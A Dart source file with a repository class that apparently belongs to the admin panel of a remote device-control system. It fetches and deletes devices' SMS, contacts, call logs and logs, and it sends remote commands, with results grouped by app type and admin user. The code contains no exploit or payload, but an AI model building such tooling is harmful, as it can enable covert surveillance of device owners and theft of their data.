import 'package:dio/dio.dart';
import '../models/device.dart';
import '../models/sms_message.dart';
import '../models/contact.dart';
import '../models/call_log.dart';
import '../models/device_log.dart';
import '../models/stats.dart';
import '../models/app_type.dart';
import '../services/api_service.dart';
import '../../core/constants/api_constants.dart';

class DeviceRepository {
  final ApiService _apiService = ApiService();
  
  bool _isDeleteSuccess(Response response) {
    final code = response.statusCode ?? 0;
    if (code >= 200 && code < 300) {
      if (response.data == null) return true;
      if (response.data is Map<String, dynamic>) {
        return response.data['success'] == true;
      }
      return true;
    }
    return false;
  }

  Future<AppTypesResponse?> getAppTypes({String? adminUsername}) async {
    try {
      final queryParams = <String, dynamic>{};
      
      if (adminUsername != null && adminUsername.isNotEmpty) {
        queryParams['admin_username'] = adminUsername;
      }
      
      final response = await _apiService.get(
        ApiConstants.appTypes,
        queryParameters: queryParams.isNotEmpty ? queryParams : null,
      );

      if (response.statusCode == 200) {
        return AppTypesResponse.fromJson(response.data);
      }
      return null;
    } catch (e) {
      throw Exception('Error fetching app types');
    }
  }

  Future<Map<String, dynamic>> getDevices({
    int skip = 0,
    int limit = 50,
    String? appType,
    String? adminUsername,
  }) async {
    try {
      final queryParams = <String, dynamic>{
        'skip': skip,
        'limit': limit,
        // Add timestamp to prevent browser/HTTP cache
        '_t': DateTime.now().millisecondsSinceEpoch,
      };
      
      if (appType != null && appType.isNotEmpty) {
        queryParams['app_type'] = appType;
      }
      
      if (adminUsername != null && adminUsername.isNotEmpty) {
        queryParams['admin_username'] = adminUsername;
      }
      
      final response = await _apiService.get(
        ApiConstants.devices,
        queryParameters: queryParams,
      );

      if (response.statusCode == 200) {
        final List devices = response.data['devices'];
        final int total = response.data['total'] ?? devices.length;

        return {
          'devices': devices.map((json) => Device.fromJson(json)).toList(),
          'total': total,
          'hasMore': (skip + devices.length) < total,
        };
      }
      return {
        'devices': <Device>[],
        'total': 0,
        'hasMore': false,
      };
    } catch (e) {
      throw Exception('Error fetching devices list: $e');
    }
  }

  Future<Device?> getDevice(String deviceId) async {
    try {
      final response = await _apiService.get(
        ApiConstants.deviceDetail(deviceId),
      );

      if (response.statusCode == 200) {
        return Device.fromJson(response.data);
      }
      return null;
    } catch (e) {
      throw Exception('Error fetching device information');
    }
  }

  Future<bool> deleteDevice(String deviceId) async {
    try {
      final response = await _apiService.delete(
        ApiConstants.deviceDelete(deviceId),
      );

      return _isDeleteSuccess(response);
    } catch (e) {
      return false;
    }
  }

  Future<bool> deleteDeviceSms(String deviceId) async {
    try {
      final response = await _apiService.delete(ApiConstants.deviceSms(deviceId));
      return _isDeleteSuccess(response);
    } catch (e) {
      return false;
    }
  }

  Future<bool> deleteDeviceContacts(String deviceId) async {
    try {
      final response = await _apiService.delete(ApiConstants.deviceContacts(deviceId));
      return _isDeleteSuccess(response);
    } catch (e) {
      return false;
    }
  }

  Future<bool> deleteDeviceCalls(String deviceId) async {
    try {
      final response = await _apiService.delete(ApiConstants.deviceCalls(deviceId));
      return _isDeleteSuccess(response);
    } catch (e) {
      return false;
    }
  }

  Future<bool> deleteSingleSms(String deviceId, String smsId) async {
    try {
      final response = await _apiService.delete(ApiConstants.deviceSmsSingle(deviceId, smsId));
      return _isDeleteSuccess(response);
    } catch (_) {
      return false;
    }
  }

  Future<bool> deleteSingleContact(String deviceId, String contactId) async {
    try {
      final response = await _apiService.delete(ApiConstants.deviceContactSingle(deviceId, contactId));
      return _isDeleteSuccess(response);
    } catch (_) {
      return false;
    }
  }

  Future<bool> deleteSingleCall(String deviceId, String callId) async {
    try {
      final response = await _apiService.delete(ApiConstants.deviceCallSingle(deviceId, callId));
      return _isDeleteSuccess(response);
    } catch (_) {
      return false;
    }
  }

  Future<Map<String, dynamic>> getDeviceSms(
      String deviceId, {
        int skip = 0,
        int limit = 50,
      }) async {
    try {
      final response = await _apiService.get(
        ApiConstants.deviceSms(deviceId),
        queryParameters: {
          'skip': skip,
          'limit': limit,
        },
      );

      if (response.statusCode == 200) {
        final List messages = response.data['messages'];
        final int total = response.data['total'] ?? 0;

        return {
          'messages': messages.map((json) => SmsMessage.fromJson(json)).toList(),
          'total': total,
          'page': response.data['page'],
          'page_size': response.data['page_size'],
        };
      }
      return {'messages': [], 'total': 0};
    } catch (e) {
      throw Exception('Error fetching SMS messages');
    }
  }

  Future<Map<String, dynamic>> getDeviceContacts(
      String deviceId, {
        int skip = 0,
        int limit = 100,
      }) async {
    try {
      final response = await _apiService.get(
        ApiConstants.deviceContacts(deviceId),
        queryParameters: {
          'skip': skip,
          'limit': limit,
        },
      );

      if (response.statusCode == 200) {
        final List contacts = response.data['contacts'];
        final int total = response.data['total'] ?? 0;

        return {
          'contacts': contacts.map((json) => Contact.fromJson(json)).toList(),
          'total': total,
        };
      }
      return {'contacts': [], 'total': 0};
    } catch (e) {
      throw Exception('Error fetching contacts');
    }
  }

  Future<Map<String, dynamic>> getDeviceCalls(
      String deviceId, {
        int skip = 0,
        int limit = 100,
      }) async {
    try {
      final response = await _apiService.get(
        ApiConstants.deviceCalls(deviceId),
        queryParameters: {
          'skip': skip,
          'limit': limit,
        },
      );

      if (response.statusCode == 200) {
        final List calls = response.data['calls'];
        final int total = response.data['total'] ?? 0;

        return {
          'calls': calls.map((json) => CallLog.fromJson(json)).toList(),
          'total': total,
        };
      }
      return {'calls': [], 'total': 0};
    } catch (e) {
      throw Exception('Error fetching call logs');
    }
  }

  Future<Map<String, dynamic>> getDeviceLogs(
      String deviceId, {
        int skip = 0,
        int limit = 100,
      }) async {
    try {
      final response = await _apiService.get(
        ApiConstants.deviceLogs(deviceId),
        queryParameters: {
          'skip': skip,
          'limit': limit,
        },
      );

      if (response.statusCode == 200) {
        final List logs = response.data['logs'];
        final int total = response.data['total'] ?? 0;

        return {
          'logs': logs.map((json) => DeviceLog.fromJson(json)).toList(),
          'total': total,
        };
      }
      return {'logs': [], 'total': 0};
    } catch (e) {
      throw Exception('Error fetching logs');
    }
  }

  Future<bool> sendCommand(
      String deviceId,
      String command, {
        Map<String, dynamic>? parameters,
      }) async {
    try {
      final response = await _apiService.post(
        ApiConstants.deviceCommand(deviceId),
        data: {
          'command': command,
          'parameters': parameters ?? {},
        },
      );

      return response.statusCode == 200 && response.data['success'] == true;
    } catch (e) {
      throw Exception('Error sending command');
    }
  }

  Future<bool> updateSettings(
      String deviceId,
      DeviceSettings settings,
      ) async {
    try {
      final response = await _apiService.put(
        ApiConstants.deviceSettings(deviceId),
        data: settings.toJson(),
      );

      return response.statusCode == 200;
    } catch (e) {
      throw Exception('Error updating settings');
    }
  }

  Future<bool> updateNote(
      String deviceId,
      String? priority,
      String? message,
      ) async {
    try {
      final response = await _apiService.put(
        ApiConstants.deviceNote(deviceId),
        data: {
          if (priority != null) 'priority': priority,
          if (message != null) 'message': message,
        },
      );

      return response.statusCode == 200;
    } catch (e) {
      throw Exception('Error updating note');
    }
  }

  Future<Stats?> getStats({String? adminUsername}) async {
    try {
      final queryParams = <String, dynamic>{};
      
      if (adminUsername != null && adminUsername.isNotEmpty) {
        queryParams['admin_username'] = adminUsername;
      }
      
      final response = await _apiService.get(
        ApiConstants.stats,
        queryParameters: queryParams.isNotEmpty ? queryParams : null,
      );

      if (response.statusCode == 200) {
        return Stats.fromJson(response.data);
      }
      return null;
    } catch (e) {
      throw Exception('Error fetching statistics');
    }
  }

}
